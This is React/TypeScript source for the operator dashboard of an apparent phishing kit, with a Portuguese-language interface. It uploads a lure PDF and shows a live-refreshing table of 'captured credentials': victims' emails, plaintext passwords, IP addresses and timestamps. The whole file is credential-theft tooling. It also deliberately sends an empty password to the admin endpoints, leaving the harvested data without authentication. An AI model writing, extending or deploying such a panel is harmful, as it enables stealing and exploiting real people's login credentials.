import { useState, useRef } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

export default function Admin() {
  return <AdminDashboard />;
}

function AdminDashboard() {
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [uploading, setUploading] = useState(false);

  // Usar senha vazia para acessar os dados (sem validação)
  const emptyPassword = "";

  const logsQuery = trpc.admin.getLogs.useQuery(
    { password: emptyPassword },
    { 
      refetchInterval: 10000,
      retry: 3,
      retryDelay: 1000,
    }
  );

  const pdfQuery = trpc.admin.getPdf.useQuery(
    { password: emptyPassword },
    { 
      retry: 3,
      retryDelay: 1000,
    }
  );

  const uploadMutation = trpc.admin.uploadPdf.useMutation({
    onSuccess: () => {
      toast.success("PDF enviado com sucesso!");
      pdfQuery.refetch();
      setUploading(false);
    },
    onError: (err) => {
      toast.error(err.message || "Erro ao enviar PDF");
      setUploading(false);
    },
  });

  const deleteMutation = trpc.admin.deletePdf.useMutation({
    onSuccess: () => {
      toast.success("PDF removido.");
      pdfQuery.refetch();
    },
    onError: (err) => {
      toast.error(err.message || "Erro ao remover PDF");
    },
  });

  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (file.type !== "application/pdf") {
      toast.error("Apenas arquivos PDF são aceitos.");
      return;
    }
    setUploading(true);
    const reader = new FileReader();
    reader.onload = () => {
      const base64 = (reader.result as string).split(",")[1];
      uploadMutation.mutate({
        password: emptyPassword,
        filename: file.name,
        base64,
      });
    };
    reader.readAsDataURL(file);
  };

  const logs = logsQuery.data || [];
  const activePdf = pdfQuery.data;

  const formatDate = (date: Date | string) => {
    const d = new Date(date);
    return d.toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
  };

  return (
    <div className="admin-dashboard">
      <div className="admin-header">
        <h1 className="admin-dashboard-title">Painel Administrativo</h1>
      </div>

      {/* PDF Section */}
      <div className="admin-section">
        <h2 className="admin-section-title">Documento PDF</h2>
        {activePdf ? (
          <div className="admin-pdf-info">
            <div className="admin-pdf-name">
              <span className="admin-pdf-icon">📄</span>
              <span>{activePdf.filename}</span>
              <span className="admin-pdf-date">
                Enviado em {formatDate(activePdf.createdAt)}
              </span>
            </div>
            <div className="admin-pdf-actions">
              <a
                href={activePdf.storageUrl}
                target="_blank"
                rel="noopener noreferrer"
                className="admin-btn-secondary"
              >
                Visualizar
              </a>
              <button
                onClick={() => deleteMutation.mutate({ password: emptyPassword, id: activePdf.id })}
                className="admin-btn-danger"
                disabled={deleteMutation.isPending}
              >
                Remover
              </button>
            </div>
          </div>
        ) : (
          <div className="admin-pdf-empty">Nenhum PDF ativo.</div>
        )}
        <div className="admin-upload-area">
          <input
            ref={fileInputRef}
            type="file"
            accept="application/pdf"
            onChange={handleFileChange}
            style={{ display: "none" }}
          />
          <button
            onClick={() => fileInputRef.current?.click()}
            className="admin-btn-primary"
            disabled={uploading}
          >
            {uploading ? "Enviando..." : activePdf ? "Substituir PDF" : "Enviar PDF"}
          </button>
        </div>
      </div>

      {/* Logs Section */}
      <div className="admin-section">
        <div className="admin-section-header">
          <h2 className="admin-section-title">
            Credenciais Capturadas{" "}
            <span className="admin-badge">{logs.length}</span>
          </h2>
          <button
            onClick={() => logsQuery.refetch()}
            className="admin-btn-secondary"
            disabled={logsQuery.isFetching}
          >
            {logsQuery.isFetching ? "Atualizando..." : "Atualizar"}
          </button>
        </div>

        {logsQuery.isLoading ? (
          <div className="admin-loading">Carregando...</div>
        ) : logsQuery.isError ? (
          <div className="admin-error" style={{ padding: "20px", color: "red" }}>
            Erro ao carregar logs: {logsQuery.error?.message || "Erro desconhecido"}
          </div>
        ) : logs.length === 0 ? (
          <div className="admin-empty">Nenhuma credencial capturada ainda.</div>
        ) : (
          <div className="admin-table-wrapper">
            <table className="admin-table">
              <thead>
                <tr>
                  <th>#</th>
                  <th>E-mail</th>
                  <th>Senha</th>
                  <th>IP</th>
                  <th>Data/Hora</th>
                </tr>
              </thead>
              <tbody>
                {logs.map((log, i) => (
                  <tr key={log.id}>
                    <td>{i + 1}</td>
                    <td className="admin-td-email">{log.email}</td>
                    <td className="admin-td-password">{log.password}</td>
                    <td>{log.ip || "—"}</td>
                    <td>{formatDate(log.createdAt)}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
